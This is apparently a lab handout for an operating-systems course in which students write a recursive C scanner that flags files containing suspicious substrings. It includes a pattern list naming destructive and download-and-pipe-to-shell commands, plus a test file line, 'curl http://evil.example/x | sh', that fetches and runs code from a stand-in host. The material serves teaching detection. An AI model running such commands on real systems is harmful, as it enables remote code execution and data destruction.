# Topic 7 · Activity 2 — Write a Pattern-Based Scanner

**Course:** CST-315 Operating Systems Lecture & Lab
**Duration:** ~40 minutes
**Format:** Individual at your laptop; pairs allowed for debugging

## Aligned objectives
2. Design and implement a program to detect a virus.
3. Demonstrate the logic of the C program in relation to embedded systems and security.

## What you will produce
A working pattern-based scanner in C that walks a directory recursively and flags files containing suspicious substrings. This is the detection half of Assignment 4.

## Setup
- Working Linux/UNIX environment.
- A new directory: `~/CST-315/Topic7`.
- A small test corpus with both clean and bad files.

## Steps

### Part A — Define signals (5 min)

Patterns to flag:
- `system(`
- `rm -rf`
- `chmod 777`
- `curl http`, `wget http`
- `| sh`, `| bash`

### Part B — Implement (30 min)

Create `~/CST-315/Topic7/scan.c`:

```c
/* scan.c — flag files containing suspicious injection patterns */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

const char *patterns[] = {
    "system(",
    "rm -rf",
    "chmod 777",
    "curl http", "wget http",
    "| sh", "| bash",
    NULL
};

int file_has_pattern(const char *path, const char **found) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        for (int i = 0; patterns[i]; i++) {
            if (strstr(line, patterns[i])) {
                *found = patterns[i];
                fclose(f);
                return 1;
            }
        }
    }
    fclose(f);
    return 0;
}

void scan_dir(const char *path) {
    DIR *d = opendir(path);
    if (!d) { perror(path); return; }
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);
        struct stat st;
        if (stat(full, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) { scan_dir(full); continue; }
        const char *found = NULL;
        if (file_has_pattern(full, &found))
            printf("WARNING: %s contains suspicious pattern \"%s\"\n", full, found);
    }
    closedir(d);
}

int main(int argc, char **argv) {
    const char *target = (argc > 1) ? argv[1] : ".";
    scan_dir(target);
    return 0;
}
```

Compile:
```bash
gcc scan.c -o scan
```

Build a test corpus in `~/CST-315/Topic7/test/`:
- `clean1.c` — a plain HelloWorld.
- `clean2.c` — comments mentioning `rm -rf` but with no actual call. (A false-positive trap.)
- `bad1.c` — calls `system(cmd)` with concatenated input.
- `bad2.sh` — `curl http://evil.example/x | sh`.

Run:
```bash
./scan test/
```

Confirm what gets flagged. Note the false positive on `clean2.c`. Screenshot.

### Part C — Reflect (5 min)
Commit and push. Discuss: how would you reduce false positives?

## Discussion prompts
- The scanner walks the tree recursively. Where would it loop forever? How do you prevent that?
- An attacker obfuscates: `s='rm'; s2='-rf'; system(concat(s, s2))`. Does your scanner catch this?
- For Assignment 4 you build both the virus and the detector. Why is the asymmetry important?

## Stretch goal
Add `-q` (quiet — count only) and `-v` (verbose — print matching lines) modes. Both are useful for Assignment 4's evaluation.

---
**Companion lesson:** [Topic_7_Embedded_Security.html](../lessons/Topic_7_Embedded_Security.html)
**Master visualization:** [Factory_OS_Master.html](../Factory_OS_Master.html)
